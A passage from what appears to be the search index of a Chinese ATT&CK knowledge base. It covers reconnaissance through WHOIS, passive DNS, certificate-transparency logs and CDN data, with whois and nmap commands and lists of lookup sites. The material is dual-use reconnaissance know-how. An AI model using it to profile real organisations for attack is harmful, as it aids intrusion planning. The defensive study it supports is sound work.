u5730\u533a\u7684NIC\u662f\u7531APNIC\u8d1f\u8d23\u3002</p> <p>\u901a\u8fc7whois\u547d\u4ee4\u884c\u5de5\u5177\u6765\u67e5\u8be2</p> <pre><code>sudo apt install whois    # \u5b89\u88c5whois\u5de5\u5177\nwhois 8.8.8.8\nwhois sina.com\nwhois -h whois.apnic.net  66.102.251.24\n</code></pre> <p>\u5728\u7ebfwhois\u7f51\u7ad9\u67e5\u8be2</p> <pre><code>http://www.afrinic.net    # AFRINIC\nhttp://www.apnic.net      # APNIC\nhttp://ws.arin.net        # ARIN\nhttp://www.iana.com       # IANA\nhttp://www.icann.org      # ICANN\nhttp://www.lacnic.net     # LACNIC\nhttp://www.nro.net        # NRO\nhttp://www.ripe.net       # RIPE\nhttp://internic.net       # InterNic\n</code></pre>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-001-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-DNS_%E8%A2%AB%E5%8A%A8DNS/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>\u65e0</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-001-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-DNS_%E8%A2%AB%E5%8A%A8DNS/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u65e0</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-001-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-DNS_%E8%A2%AB%E5%8A%A8DNS/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u65e0</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-001-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-DNS_%E8%A2%AB%E5%8A%A8DNS/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":"<p>\u65e0</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-001-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-DNS_%E8%A2%AB%E5%8A%A8DNS/#_6","title":"\u5efa\u8bae","text":"<p>\u8bb8\u591a\u6b64\u7c7b\u653b\u51fb\u6d3b\u52a8\u7684\u53d1\u751f\u7387\u5f88\u9ad8\uff0c\u5e76\u4e14\u76f8\u5173\u7684\u8bef\u62a5\u7387\u4e5f\u5f88\u9ad8\uff0c\u5e76\u4e14\u6709\u53ef\u80fd\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u76d1\u6d4b\u8303\u56f4\u4e4b\u5916\uff0c\u4ece\u800c\u4f7f\u9632\u5fa1\u8005\u96be\u4ee5\u53d1\u73b0\u3002</p> <p>\u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u4f1a\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\"\u521d\u59cb\u8bbf\u95ee\"\u9636\u6bb5\u3002</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-001-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-DNS_%E8%A2%AB%E5%8A%A8DNS/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1596-001</p> <p>https://attack.mitre.org/techniques/T1596/001/</p> <p>\u4fe1\u606f\u6536\u96c6\u2014\u2014DNS\u4fe1\u606f\u6536\u96c6</p> <p>https://blog.csdn.net/weixin_45126664/article/details/107603032</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-002-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-WHOIS/","title":"T1596-002-\u641c\u7d22\u5f00\u653e\u7684\u6280\u672f\u6570\u636e\u5e93-WHOIS","text":""},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-002-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-WHOIS/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u4ee5\u5728WHOIS\u516c\u5f00\u6570\u636e\u4e2d\u641c\u7d22\u53d7\u5bb3\u8005\u4f7f\u7528\u7684\u76ee\u6807\u4fe1\u606f\u3002WHOIS\u6570\u636e\u7531\u8d1f\u8d23\u5206\u914d\u548c\u5206\u914d\u57df\u540d\u7b49Internet\u8d44\u6e90\u7684\u533a\u57dfInternet\u6ce8\u518c\u8868\uff08RIR\uff09\u5b58\u50a8\u3002\u4efb\u4f55\u4eba\u90fd\u53ef\u4ee5\u67e5\u8be2WHOIS\u670d\u52a1\u5668\u4ee5\u83b7\u53d6\u6709\u5173\u6ce8\u518c\u57df\u7684\u4fe1\u606f\uff0c\u4f8b\u5982\u5206\u914d\u7684IP\u5730\u5740\uff0c\u8054\u7cfb\u4fe1\u606f\u548cDNS\u540d\u79f0\u670d\u52a1\u5668\u3002</p> <p>\u653b\u51fb\u8005\u53ef\u4ee5\u641c\u7d22WHOIS\u6570\u636e\u7528\u4ee5\u6536\u96c6\u53ef\u884c\u7684\u4fe1\u606f\u3002\u5a01\u80c1\u884c\u52a8\u8005\u53ef\u4ee5\u4f7f\u7528\u5728\u7ebf\u8d44\u6e90\u6216\u547d\u4ee4\u884c\u5b9e\u7528\u7a0b\u5e8f\u901a\u8fc7WHOIS\u6570\u636e\u8fdb\u884c\u63a0\u593a\uff0c\u4ee5\u83b7\u53d6\u6709\u5173\u6f5c\u5728\u53d7\u5bb3\u8005\u7684\u4fe1\u606f\u3002\u8fd9\u4e9b\u6765\u6e90\u63d0\u4f9b\u7684\u4fe1\u606f\u53ef\u80fd\u4f1a\u63d0\u4f9b\u5176\u4ed6\u5f62\u5f0f\u7684\u4fa6\u5bdf\u673a\u4f1a\uff08\u4f8b\u5982\uff1a\u4e3b\u52a8\u626b\u63cf\u6216\u7f51\u7edc\u9493\u9c7c\uff09\uff0c\u5efa\u7acb\u8fd0\u8425\u8d44\u6e90\uff08\u4f8b\u5982\uff1a\u83b7\u53d6\u57fa\u7840\u8bbe\u65bd\u6216\u7834\u574f\u57fa\u7840\u8bbe\u65bd\uff09\u6216\u521d\u59cb\u8bbf\u95ee\uff08\u4f8b\u5982\uff1a\u5916\u90e8\u8fdc\u7a0b\u670d\u52a1\u6216\u4fe1\u4efb\u5173\u7cfb\uff09\u3002</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-002-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-WHOIS/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>whois\uff08\u8bfb\u4f5c\u201cWho is\u201d\uff0c\u975e\u7f29\u5199\uff09\u662f\u7528\u6765\u67e5\u8be2\u57df\u540d\u7684IP\u4ee5\u53ca\u6240\u6709\u8005\u7b49\u4fe1\u606f\u7684\u4f20\u8f93\u534f\u8bae\u3002\u7b80\u5355\u8bf4\uff0cwhois\u5c31\u662f\u4e00\u4e2a\u7528\u6765\u67e5\u8be2\u57df\u540d\u662f\u5426\u5df2\u7ecf\u88ab\u6ce8\u518c\uff0c\u4ee5\u53ca\u6ce8\u518c\u57df\u540d\u7684\u8be6\u7ec6\u4fe1\u606f\u7684\u6570\u636e\u5e93\uff08\u5982\u57df\u540d\u6240\u6709\u4eba\u3001\u57df\u540d\u6ce8\u518c\u5546\uff09\u3002\u901a\u8fc7whois\u6765\u5b9e\u73b0\u5bf9\u57df\u540d\u4fe1\u606f\u7684\u67e5\u8be2\u3002</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-002-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-WHOIS/#_2","title":"\u7f51\u7ad9\u67e5\u8be2","text":"<ul> <li>\u57df\u540dWhois\u67e5\u8be2 - \u7ad9\u957f\u4e4b\u5bb6</li> <li>Whois \u7231\u7ad9</li> <li>ip138</li> <li>\u57df\u540d\u4fe1\u606f\u67e5\u8be2 - \u817e\u8baf\u4e91</li> <li>nicolasbouliane</li> <li>\u65b0\u7f51 whois\u4fe1\u606f\u67e5\u8be2</li> <li>IP WHOIS\u67e5\u8be2 - \u7ad9\u957f\u5de5\u5177</li> <li>\u5fae\u6b65\u5728\u7ebf</li> <li>Bugscaner</li> </ul>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-002-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-WHOIS/#_3","title":"\u5de5\u5177\u67e5\u8be2","text":"<p>\u5728\u547d\u4ee4\u884c\u8f93\u5165whosi+\u57df\u540d</p> <p>\u4f7f\u7528Nmap\u67e5\u8be2\uff0c\u4f7f\u7528\u8fd9\u4e2a\u65b9\u6cd5\u8fd8\u53ef\u4ee5\u7206\u51fa\u76ee\u6807\u7684\u7aef\u53e3\u53f7\u5f00\u542f\u4e0e\u5426\uff1anmap --script=whois-domain +\u57df\u540d</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-002-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-WHOIS/#_4","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>\u65e0</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-002-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-WHOIS/#_5","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u65e0</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-002-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-WHOIS/#_6","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u65e0</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-002-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-WHOIS/#_7","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":"<p>\u65e0</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-002-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-WHOIS/#_8","title":"\u5efa\u8bae","text":"<p>\u8bb8\u591a\u6b64\u7c7b\u653b\u51fb\u6d3b\u52a8\u7684\u53d1\u751f\u7387\u5f88\u9ad8\uff0c\u5e76\u4e14\u76f8\u5173\u7684\u8bef\u62a5\u7387\u4e5f\u5f88\u9ad8\uff0c\u5e76\u4e14\u6709\u53ef\u80fd\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u76d1\u6d4b\u8303\u56f4\u4e4b\u5916\uff0c\u4ece\u800c\u4f7f\u9632\u5fa1\u8005\u96be\u4ee5\u53d1\u73b0\u3002</p> <p>\u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u4f1a\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\"\u521d\u59cb\u8bbf\u95ee\"\u9636\u6bb5\u3002</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-002-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-WHOIS/#_9","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1596-002</p> <p>https://attack.mitre.org/techniques/T1596/002/</p> <p>Whois\u4fe1\u606f\u6536\u96c6\u53ca\u5229\u7528\u65b9\u5f0f</p> <p>https://blog.csdn.net/m0_48520508/article/details/107301211</p> <p>whois\u67e5\u8be2.\u767d\u5e3d\u4e0e\u5b89\u5168</p> <p>https://www.kancloud.cn/noahs/src_hacker/2120641</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-003-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6/","title":"T1596-003-\u641c\u7d22\u5f00\u653e\u7684\u6280\u672f\u6570\u636e\u5e93-\u6570\u5b57\u8bc1\u4e66","text":""},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-003-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u4ee5\u5728\u516c\u5171\u6570\u5b57\u8bc1\u4e66\u6570\u636e\u4e2d\u641c\u7d22\u6709\u5173\u53d7\u5bb3\u8005\u4f7f\u7528\u7684\u76ee\u6807\u7684\u4fe1\u606f\u3002\u6570\u5b57\u8bc1\u4e66\u7531\u8bc1\u4e66\u9881\u53d1\u673a\u6784\uff08CA\uff09\u9881\u53d1\uff0c\u4ee5\u52a0\u5bc6\u65b9\u5f0f\u9a8c\u8bc1\u7b7e\u540d\u5185\u5bb9\u7684\u6765\u6e90\u3002\u8fd9\u4e9b\u8bc1\u4e66\uff08\u4f8b\u5982\u7528\u4e8e\u52a0\u5bc6Web\u6d41\u91cfHTTPS SSL/TLS\u901a\u4fe1\u7684\u8bc1\u4e66\uff09\u5305\u542b\u6709\u5173\u6ce8\u518c\u7ec4\u7ec7\u7684\u4fe1\u606f\uff0c\u4f8b\u5982\u540d\u79f0\u548c\u4f4d\u7f6e\u3002</p> <p>\u653b\u51fb\u8005\u53ef\u4ee5\u641c\u7d22\u6570\u5b57\u8bc1\u4e66\u6570\u636e\u7528\u4e8e\u6536\u96c6\u53ef\u64cd\u4f5c\u7684\u4fe1\u606f\u3002\u5a01\u80c1\u53c2\u4e0e\u8005\u53ef\u4ee5\u4f7f\u7528\u5728\u7ebf\u8d44\u6e90\u548c\u67e5\u627e\u5de5\u5177\u6765\u6536\u96c6\u6709\u5173\u8bc1\u4e66\u7684\u4fe1\u606f\u3002\u6570\u5b57\u8bc1\u4e66\u6570\u636e\u4e5f\u53ef\u4ee5\u4ece\u7ec4\u7ec7\u7b7e\u540d\u7684\u7ec4\u4ef6\u4e2d\u83b7\u5f97\uff08\u4f8b\u5982\uff1a\u52a0\u5bc6\u7684\u7f51\u7edc\u6d41\u91cf\u4e2d\u4f7f\u7528\u7684\u8bc1\u4e66\u968f\u5185\u5bb9\u4e00\u8d77\u63d0\u4f9b\uff09\u3002\u6765\u81ea\u8fd9\u4e9b\u6765\u6e90\u7684\u4fe1\u606f\u53ef\u80fd\u4f1a\u63d0\u4f9b\u5176\u4ed6\u5f62\u5f0f\u7684\u4fa6\u5bdf\u673a\u4f1a\uff08\u4f8b\u5982\uff1a\u4e3b\u52a8\u626b\u63cf\u6216\u7f51\u7edc\u9493\u9c7c\uff09\uff0c\u5efa\u7acb\u8fd0\u8425\u8d44\u6e90\uff08\u4f8b\u5982\uff1a\u5f00\u53d1\u80fd\u529b\u6216\u83b7\u5f97\u80fd\u529b\uff09\u6216\u521d\u59cb\u8bbf\u95ee\uff08\u4f8b\u5982\uff1a\u5916\u90e8\u8fdc\u7a0b\u670d\u52a1\u6216\u8005\u4fe1\u4efb\u5173\u7cfb\uff09\u3002</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-003-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u8bc1\u4e66\u900f\u660e\u5ea6(Certificate Transparency,CT)\u662f\u8bc1\u4e66\u6388\u6743\u673a\u6784(CA)\u7684\u4e00\u4e2a\u9879\u76ee\uff0c\u8bc1\u4e66\u6388\u6743\u673a\u6784\u4f1a\u4e3a\u6bcf\u4e00\u4e2aSSL/TLS\u8bc1\u4e66\u53d1\u5e03\u5230\u516c\u5171\u65e5\u5fd7\u4e2d\u3002\u4e00\u4e2aSSL/TLS\u8bc1\u4e66\u901a\u5e38\u5305\u542b\u57df\u540d\u3001\u5b50\u57df\u540d\u548c\u90ae\u7bb1\u5730\u5740\uff0c\u8fd9\u4e9b\u4e5f\u7ecf\u5e38\u6210\u4e3a\u653b\u51fb\u8005\u975e\u5e38\u5e0c\u671b\u83b7\u5f97\u7684\u6709\u7528\u4fe1\u606f\u3002\u67e5\u627e\u67d0\u4e2a\u57df\u540d\u6240\u5c5e\u8bc1\u4e66\u7684\u6700\u7b80\u5355\u7684\u65b9\u6cd5\u5c31\u662f\u4f7f\u7528\u641c\u7d22\u5f15\u64ce\u641c\u7d22\u4e00\u4e9b\u516c\u5f00\u7684CT\u65e5\u5fd7\u3002</p> <ol> <li> <p>https://crt.sh/</p> </li> <li> <p>https://censys.io/</p> </li> <li> <p>https://developers.facebook.com/tools/ct/</p> </li> <li> <p>https://google.com/transparencyreport/https/ct/</p> </li> </ol>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-003-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>\u65e0</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-003-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u65e0</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-003-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u65e0</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-003-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":"<p>\u65e0</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-003-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6/#_6","title":"\u5efa\u8bae","text":"<p>\u8bb8\u591a\u6b64\u7c7b\u653b\u51fb\u6d3b\u52a8\u7684\u53d1\u751f\u7387\u5f88\u9ad8\uff0c\u5e76\u4e14\u76f8\u5173\u7684\u8bef\u62a5\u7387\u4e5f\u5f88\u9ad8\uff0c\u5e76\u4e14\u6709\u53ef\u80fd\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u76d1\u6d4b\u8303\u56f4\u4e4b\u5916\uff0c\u4ece\u800c\u4f7f\u9632\u5fa1\u8005\u96be\u4ee5\u53d1\u73b0\u3002</p> <p>\u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u4f1a\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\"\u521d\u59cb\u8bbf\u95ee\"\u9636\u6bb5\u3002</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-003-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1596-003</p> <p>https://attack.mitre.org/techniques/T1596/003/</p> <p>\u5168\u6d41\u7a0b\u4fe1\u606f\u6536\u96c6\u65b9\u6cd5\u603b\u7ed3</p> <p>https://www.freebuf.com/articles/database/195169.html</p> <p>\u3010\u77e5\u4e86\u5802\u4fe1\u5b89\u7b14\u8bb0\u3011\u6e17\u900f\u6d4b\u8bd5\u4e4b\u4fe1\u606f\u6536\u96c6\uff08\u4e8c\uff09</p> <p>https://zhuanlan.zhihu.com/p/86250911</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-004-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-CDN/","title":"T1596-004-\u641c\u7d22\u5f00\u653e\u7684\u6280\u672f\u6570\u636e\u5e93-CDN","text":""},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-004-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-CDN/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u4ee5\u641c\u7d22\u6709\u5173\u76ee\u6807\u53d7\u5bb3\u8005\u7684\u5185\u5bb9\u4f20\u9012\u7f51\u7edc\uff08CDN\uff09\u6570\u636e\u3002CDN\u5141\u8bb8\u7ec4\u7ec7\u6258\u7ba1\u6765\u81ea\u5206\u5e03\u5f0f\uff0c\u8d1f\u8f7d\u5747\u8861\u7684\u670d\u52a1\u5668\u9635\u5217\u7684\u5185\u5bb9\u3002CDN\u8fd8\u53ef\u4ee5\u5141\u8bb8\u7ec4\u7ec7\u6839\u636e\u8bf7\u6c42\u8005\u7684\u5730\u7406\u533a\u57df\u81ea\u5b9a\u4e49\u5185\u5bb9\u4f20\u9012\u3002</p> <p>\u653b\u51fb\u8005\u53ef\u4ee5\u641c\u7d22CDN\u6570\u636e\u7528\u4ee5\u6536\u96c6\u53ef\u64cd\u4f5c\u7684\u4fe1\u606f\u3002\u5a01\u80c1\u53c2\u4e0e\u8005\u53ef\u4ee5\u4f7f\u7528\u5728\u7ebf\u8d44\u6e90\u548c\u67e5\u627e\u5de5\u5177\u6765\u6536\u96c6\u6709\u5173CDN\u4e2d\u5185\u5bb9\u670d\u52a1\u5668\u7684\u4fe1\u606f\u3002\u653b\u51fb\u8005\u8fd8\u53ef\u80fd\u5bfb\u6c42\u548c\u9488\u5bf9CDN\u9519\u8bef\u914d\u7f6e\uff0c\u8fd9\u4e9b\u914d\u7f6e\u53ef\u80fd\u6cc4\u6f0f\u4e0d\u5e0c\u671b\u6258\u7ba1\u7684\u654f\u611f\u4fe1\u606f\u6216\u4e0d\u5177\u6709\u4e0e\u7ec4\u7ec7\u7f51\u7ad9\u4e0a\u6258\u7ba1\u7684\u5185\u5bb9\u76f8\u540c\u7684\u4fdd\u62a4\u673a\u5236\uff08\u4f8b\u5982\u767b\u5f55\u95e8\u6237\uff09\u3002\u6765\u81ea\u8fd9\u4e9b\u6765\u6e90\u7684\u4fe1\u606f\u53ef\u80fd\u4f1a\u63d0\u4f9b\u5176\u4ed6\u5f62\u5f0f\u7684\u4fa6\u5bdf\u673a\u4f1a\uff08\u4f8b\u5982\uff1a\u4e3b\u52a8\u626b\u63cf\u6216\u641c\u7d22\u5f00\u653e\u7684\u7f51\u7ad9/\u57df\uff09\uff0c\u5efa\u7acb\u8fd0\u8425\u8d44\u6e90\uff08\u4f8b\u5982\uff1a\u83b7\u53d6\u57fa\u7840\u8bbe\u65bd\u6216\u635f\u5bb3\u57fa\u7840\u8bbe\u65bd\uff09\u6216\u521d\u59cb\u8bbf\u95ee\uff08\u4f8b\u5982\uff1a\u59a5\u534f\uff09\u3002</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-004-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-CDN/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u6316\u6d1e\u7ecf\u9a8c|\u4ece\u8d1f\u8f7d\u5747\u8861\u6216CDN\u5e94\u7528\u4e2d\u53d1\u73b0\u7684\u914d\u7f6e\u7c7b\u6f0f\u6d1e</p> <p>https://www.freebuf.com/vuls/227805.html</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-004-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-CDN/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>\u65e0</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-004-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-CDN/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u65e0</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-004-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-CDN/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u65e0</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-004-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-CDN/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":"<p>\u65e0</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-004-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-CDN/#_6","title":"\u5efa\u8bae","text":"<p>\u8bb8\u591a\u6b64\u7c7b\u653b\u51fb\u6d3b\u52a8\u7684\u53d1\u751f\u7387\u5f88\u9ad8\uff0c\u5e76\u4e14\u76f8\u5173\u7684\u8bef\u62a5\u7387\u4e5f\u5f88\u9ad8\uff0c\u5e76\u4e14\u6709\u53ef\u80fd\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u76d1\u6d4b\u8303\u56f4\u4e4b\u5916\uff0c\u4ece\u800c\u4f7f\u9632\u5fa1\u8005\u96be\u4ee5\u53d1\u73b0\u3002</p> <p>\u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u4f1a\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\"\u521d\u59cb\u8bbf\u95ee\"\u9636\u6bb5\u3002</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1596-004-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B0%E6%8D%AE%E5%BA%93-CDN/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1596-004</p> <p>https://attack.mitre.org/techniques/T1596/004/</p> <p>\u6316\u6d1e\u7ecf\u9a8c|\u4ece\u8d1f\u8f7d\u5747\u8861\u6216CDN\u5e94\u7528\u4e2d\u53d1\u73b0\u7684\u914d\u7f6e\u7c7b\u6f0f\u6d1e</p> 